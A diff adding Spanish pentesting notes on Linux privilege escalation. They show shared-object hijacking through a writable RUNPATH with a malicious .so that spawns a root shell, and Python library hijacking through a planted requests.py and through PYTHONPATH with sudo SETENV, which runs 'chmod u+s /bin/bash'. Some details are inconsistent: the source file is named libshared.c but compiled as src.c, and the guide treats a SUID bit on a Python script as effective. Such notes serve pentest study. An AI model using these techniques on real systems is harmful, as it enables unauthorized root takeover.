@@ -3034,9 +3034,169 @@ root@@debian #: whoami
 root
 ```
 
+##### Shared Object
+
+###### ¿Qué es un Shared Object (.so)?
+
+Un `shared object` (objeto compartido) es un archivo binario compilado que contiene código y datos reutilizables por múltiples programas. En sistemas **Unix-like** (como Linux), estos archivos tienen la extensión **.so** y permiten:
+
+- **Reducir redundancia**: Varios programas pueden cargar la misma biblioteca en memoria.
+- **Ahorrar recursos**: Evita duplicar código en cada ejecutable.
+
+###### Explotación mediante Manipulación de Bibliotecas
+
+Algunos binarios utilizan bibliotecas personalizadas (no estándar). Si tenemos acceso de escritura sobre estas, podemos escalar privilegios.
+
+Ejemplo Práctico
+
+1. **Identificar un binario con SUID (ejecución como propietario, normalmente root)**:
+
+    ```bash
+    elliot@debian:~$ ls -la custom_binary
+    -rwsr-xr-x 1 root root 16728 Jan 12 11:05 custom_binary
+    ```
+
+2. **Verificar las bibliotecas que usa el binario (comando `ldd`)**:
+
+    ```bash
+    elliot@debian:~$ ldd custom_binary
+    libshared.so => /lib/x86_64-linux-gnu/libshared.so (0x00007f0c13112000)
+    ```
+
+    Se observa que usa una biblioteca no estándar: `libshared.so`.
+
+3. **Ubicar la ruta de carga de bibliotecas (comando `readelf`)**:
+
+    ```bash
+    elliot@debian:~$ readelf -d custom_binary | grep PATH
+    0x00000000000000 (RUNPATH)  Library runpath: [/development]
+    ```
+
+    El binario carga la bibliotecas desde `/development`.
+
+4. **Explotación (si tenemos escritura en `/development`)**
+
+    - Creamos una biblioteca maliciosa (`libshared.c`):
+
+    ```c
+    #include<stdio.h>
+    #include<stdlib.h>
+    #include<unistd.h>
+
+    void dbquery() {
+        setuid(0);
+        system("/bin/sh -p");
+    }
+    ```
+    
+    - Compilamos y reemplazamos la biblioteca original:
+
+    ```bash
+    gcc src.c -fPIC -shared -o /development/libshared.so
+    ```
+    - Ejecutamos el binario `custom_binary`
+
+    ```bash
+    elliot@debian:~$ ./custom_binary
+    # id
+    uid=0(root) gid=1000(elliot) groups=1000(elliot)
+    ```
+
 ##### Python Library Hijacking
 
-##### Shared Object
+###### ¿Qué es?
+
+El **Python Library Hijacking** es una vulnerabilidad de seguridad que permite a un atacante ejecutar código arbitrario manipulando el entorno de Python para cargar una biblioteca maliciosa en lugar de la legítima. Esto puede llevar a:
+
+- **Escalada de privilegios** (si el script se ejecuta como root).
+- **Ejecución remota de comandos (RCE)** en aplicaciones críticas.
+
+###### ¿Cómo funciona?
+
+1. **Carga Dinámica de Módulos**
+
+Python busca los módulos importados en este orden:
+
+- **Directorio del script actual**.
+- **Directorios en `PYTHONPATH` (variable de entorno)**.
+- **Bibliotecas estándar (`/usr/lib/pythonX.X`)**.
+- `site-packages` (paquetes instalados con `pip`).
+
+2. **Explotación por Prioridad de Rutas**
+
+Si un script con SUID (ejecución como root) importa un módulo y:
+
+- Tenemos permisos de escritura en una ruta prioritaria (ej: `/usr/lib/python3.11`).
+
+- **Creamos un archivo malicioso** con el mismo nombre que el módulo legítimo (ej: `requests.py`). Python cargará **nuestro código malicioso** en lugar del módulo original.
+
+###### Caso 1: Módulo con Permisos de Escritura
+
+1. **Identificar un script Python con SUID**:
+
+    ```bash
+    ls -l /usr/bin/script.py
+    -rwsr-xr-x 1 root root 1000 Jan 10 11:00 /usr/bin/script.py
+    ```
+
+2. **Verificar qué módulos importa**:
+
+    ```bash
+    cat /usr/bin/script.py
+    import requests  # Módulo objetivo
+    ```
+
+3. **Ubicar la ruta legítima del módulo**:
+
+    ```bash
+    pip3 show requests
+    Location: /usr/local/lib/python3.11/dist-packages
+    ```
+
+4. **Explotación si tenemos escritura en /usr/lib/python3.11**:
+
+    - Crear un archivo malicioso `requests.py`:
+
+    ```bash
+    import os
+    os.setuid(0)  # Obtener root
+    os.system("/bin/bash -p")  # Spawnear shell privilegiada
+    ```
+
+    - Guardarlo en una ruta prioritaria:
+
+    ```bash
+    cp requests.py /usr/lib/python3.11/
+    ```
+
+    - Al ejecutar el script:
+
+    ```bash
+    /usr/bin/script.py  # ¡Shell como root!
+    ```
+
+###### Caso 2: Abuso de `PYTHONPATH` (si `sudo` permite `SETENV`)
+
+1. **Verificar permisos `sudo`**:
+
+    ```bash
+    sudo -l
+    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python
+    ```
+
+2. **Crear un módulo malicioso en /tmp**:
+
+    ```bash
+    # /tmp/privesc.py
+    import os
+    os.system("chmod u+s /bin/bash")
+    ```
+
+3. **Ejecutar el script objetivo con PYTHONPATH manipulado**:
+
+    ```bash
+    sudo PYTHONPATH=/tmp/ /usr/bin/python /home/elliot/script.py
+    ```
 
 ##  11. <a name='active-directory'></a>Active Directory
 
